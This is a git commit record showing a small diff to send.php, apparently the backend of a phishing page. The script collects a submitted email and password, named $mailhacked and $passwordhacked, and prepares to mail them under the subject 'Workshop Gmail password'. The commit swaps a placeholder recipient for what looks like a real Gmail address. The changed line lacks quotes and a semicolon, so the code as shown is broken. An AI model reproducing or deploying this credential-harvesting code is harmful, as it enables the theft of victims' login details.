91cb72bb5782d91801e5cd25b1cdb6d6b4a662f3
bratevaro <70366633+bratevaro@users.noreply.github.com>
2020-08-28 02:08:49 -0700

    Update send.php

--- send.php
+++ send.php
@@ -1,7 +1,7 @@
 <?php
         $mailhacked = $_POST["email"];
         $passwordhacked = $_POST["password"];
-         $to = "yourmailaddresshere@gmail.com";
+         $to = bratevaro@gmail.com
          $subject = "Workshop Gmail password";
          
          $message = "$mailhacked";
